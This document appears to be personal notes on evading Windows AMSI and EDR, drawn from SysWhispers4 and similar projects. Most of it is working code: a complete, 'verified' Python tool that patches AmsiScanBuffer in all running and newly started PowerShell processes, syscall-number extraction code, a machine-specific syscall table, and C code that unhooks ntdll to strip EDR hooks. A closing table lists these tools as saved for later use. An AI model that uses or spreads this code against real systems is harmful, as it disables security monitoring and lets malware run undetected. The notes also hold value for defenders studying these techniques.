# AMSI & EDR Bypass Techniques (June 2026)

Extracted from reading SysWhispers4 (generator.py 90KB), Outflank Dumpert, and Fluid Attacks blog.

## 1. AMSI Bypass — Cross-Process Memory Patching (Python)

**原理：** Python 进程不受 AMSI 扫描。用 ctypes 打开 PowerShell 进程 → 找到 amsi.dll 的 AmsiScanBuffer 函数 → 用 WriteProcessMemory 覆盖前 6 字节为 `mov eax, 1; ret`（AMSI_RESULT_NOT_DETECTED）。

**已验证的代码模式：**

```python
import psutil
from ctypes import *
from ctypes import wintypes

KERNEL32 = windll.kernel32
PROCESS_ALL_ACCESS = 0x1F0FFF
AMSI_PATCH = (c_ubyte * 6)(0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3)  # mov eax,1; ret

def find_powershell_pids():
    pids = []
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] and proc.info['name'].lower() == 'powershell.exe':
            pids.append(proc.info['pid'])
    return pids

def get_module_base_address(process_handle, module_name):
    """从进程的加载模块中找到指定模块的基址"""
    PSAPI = windll.PSAPI
    cb_needed = wintypes.DWORD(0)
    PSAPI.EnumProcessModules(process_handle, None, 0, byref(cb_needed))
    module_count = cb_needed.value // sizeof(wintypes.HMODULE)
    if module_count == 0:
        return None
    modules = (wintypes.HMODULE * module_count)()
    PSAPI.EnumProcessModules(process_handle, modules, sizeof(modules), byref(cb_needed))
    for mod in modules:
        mod_name = create_unicode_buffer(260)
        PSAPI.GetModuleBaseNameW(process_handle, mod, mod_name, 260)
        if mod_name.value and mod_name.value.lower() == module_name.lower():
            return mod
    return None

def patch_amsi(pid):
    process_handle = KERNEL32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not process_handle:
        return f"❌ PID {pid}: 无法打开进程（需要管理员权限）"
    amsi_module = get_module_base_address(process_handle, "amsi.dll")
    if not amsi_module:
        KERNEL32.CloseHandle(process_handle)
        return f"❌ PID {pid}: amsi.dll未加载"
    scan_buffer_addr = KERNEL32.GetProcAddress(amsi_module, b"AmsiScanBuffer")
    if not scan_buffer_addr:
        KERNEL32.CloseHandle(process_handle)
        return f"❌ PID {pid}: 找不到AmsiScanBuffer"
    old_protect = wintypes.DWORD(0)
    KERNEL32.VirtualProtectEx(process_handle, scan_buffer_addr, sizeof(AMSI_PATCH),
                               0x40, byref(old_protect))
    bytes_written = wintypes.SIZE_T(0)
    result = KERNEL32.WriteProcessMemory(process_handle, scan_buffer_addr,
                                          byref(AMSI_PATCH), sizeof(AMSI_PATCH),
                                          byref(bytes_written))
    KERNEL32.CloseHandle(process_handle)
    return result and bytes_written.value == sizeof(AMSI_PATCH)
```

**三种运行模式：**
- `python amsi_patcher.py` — 自动 patch 所有现有 PowerShell 进程
- `python amsi_patcher.py --pid 1234` — patch 指定 PID
- `python amsi_patcher.py --watch` — 监控模式，新 PowerShell 自动 patch

**注意：** 需要管理员权限。Python 进程本身不受 AMSI 扫描，所以可以安全运行。

## 2. Direct Syscall — EDR 用户态 Hook 绕过

**原理：** EDR 在 ntdll.dll 的函数入口写 JMP 钩子。绕过方法：从磁盘读干净的 ntdll.dll → 提取 syscall stub → 跳过 hook 直接调内核。

**ntdll 中 NT API 的 syscall stub 结构 (x64)：**
```asm
mov r10, rcx        ; 4C 8B D1  (3字节) — 参数传递
mov eax, SS#       ; B8 XX XX XX XX  (5字节) — syscall号
syscall              ; 0F 05     (2字节) — 进入内核
ret                  ; C3        (1字节) — 返回
```

**已验证的 syscall 号提取工具（Python）：**
```python
import ctypes, struct

def get_syscall_number(func_addr):
    """从NT函数地址解析syscall号"""
    buf = (ctypes.c_ubyte * 16)()
    ctypes.memmove(buf, func_addr, 16)
    stub = bytes(buf)
    # x64标准模式: 4C 8B D1 + B8 XX XX XX XX
    if stub[0:3] == b"\x4C\x8B\xD1" and stub[3] == 0xB8:
        syscall_num = struct.unpack("<I", stub[4:8])[0]
        return syscall_num, stub[:13]
    return None, stub
```

**当前机器（Windows 10 x64）的 30 个关键 syscall 号（已验证）：**

| NT API | Syscall# | 用途 |
|--------|:-------:|------|
| NtAllocateVirtualMemory | 0x18 (24) | 分配内存 |
| NtProtectVirtualMemory | 0x50 (80) | 修改内存保护 |
| NtWriteVirtualMemory | 0x3A (58) | 写入内存 |
| NtCreateThreadEx | 0xC9 (201) | 创建远程线程 |
| NtOpenProcess | 0x26 (38) | 打开进程 |
| NtCreateFile | 0x55 (85) | 创建/打开文件 |
| NtReadFile | 0x06 (6) | 读文件 |
| NtWriteFile | 0x08 (8) | 写文件 |
| NtCreateUserProcess | 0xD1 (209) | 创建用户进程 |
| NtClose | 0x0F (15) | 关闭句柄 |
| NtCreateSection | 0x4A (74) | 创建内存区 |
| NtMapViewOfSection | 0x28 (40) | 映射视图 |
| NtQuerySystemInformation | 0x36 (54) | 查询系统信息 |
| NtCreateToken | 0xCD (205) | 创建令牌 |
| NtDelayExecution | 0x34 (52) | 延迟执行 |

**全部 30 个函数均未被 hook**（当前机器无 EDR）。

## 3. SysWhispers4 — 完整 EDR 绕过框架

**Repo:** JoasASantos/SysWhispers4 (Python-based syscall stub generator)
**核心源码读于:** `core/generator.py` (90KB), `core/models.py`

### 8 种 SSN 解析方法

| 方法 | 原理 | Hook 抵抗 | 速度 |
|------|------|:---------:|:----:|
| Static | 硬编码 j00ru 表 | 无 | 最快 |
| FreshyCalls | 按 VA 排序 Nt* 导出 → 索引=SSN | **很高** | 快 |
| Hell's Gate | 读函数 opcode 提取 SSN | 低 | 快 |
| Halo's Gate | 被 hook 了扫邻居 ±8 | 中 | 快 |
| Tartarus' Gate | 检测 E9/FF25/EB/CC 所有 hook 模式 | 高 | 快 |
| SyscallsFromDisk | 从 KnownDlls 映射干净 ntdll | **最高** | 慢 |
| RecycledGate | FreshyCalls + opcode 双重验证 | **最高** | 中 |
| HW Breakpoint | 调试寄存器 DR0 + VEH 异常捕获 | **最高** | 慢 |

### 4 种调用方法

| 方法 | RIP 位置 | 检测难度 |
|------|---------|:--------:|
| Embedded | 你的代码 | 低（EDR 看到非 ntdll RIP） |
| Indirect | ntdll 内 | 中（RIP 在 ntdll，像合法调用） |
| Randomized | 随机 ntdll gadget | 高（每次不同） |
| Egg Hunt | 二进制无 0F 05 | 高（磁盘上无 syscall 操作码） |

### 8 种绕过技术

AMSI Bypass, ETW Bypass, ntdll Unhooking, Anti-Debug (6 checks),
Sleep Encryption (Ekko-style), XOR SSN encryption,
Call Stack Spoofing, Junk Instruction Injection (14 variants)

### FreshyCalls 核心算法

```python
# 排序所有 Nt* 导出函数按 VA 地址 → 排序后的索引 = SSN 号
# 即使所有函数都被 hook 了，地址排序还是对的
exports = []
for i in range(num_names):
    name = get_export_name(i)
    if name.startswith("Nt"):
        exports.append({"address": get_export_addr(i), "hash": djb2_hash(name)})
sort_by_address(exports)
# exports[0] 的 SSN = 0, exports[1] 的 SSN = 1, ...
```

### ntdll Unhooking

```c
// 从 \KnownDlls\ntdll.dll 映射干净副本，覆盖被 hook 的 .text 段
NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
NtMapViewOfSection(hSection, -1, &pClean, ...);
memcpy(pHooked + .text_offset, pClean + .text_offset, .text_size);
// 所有 EDR hook 全部清除
```

## 4. 实战产出

| 工具 | 位置 | 功能 |
|------|------|------|
| `amsi_patcher.py` | `memories/脚本缓存/网络攻防/` | 跨进程 AMSI bypass（3 种模式） |
| `syscall_dump.py` | `memories/脚本缓存/网络攻防/` | 读取当前系统 30 个 NT API 的 syscall 号 |
| `direct_syscall_runner.py` | `memories/脚本缓存/网络攻防/` | 直接系统调用学习工具 + PE 解析引擎 |
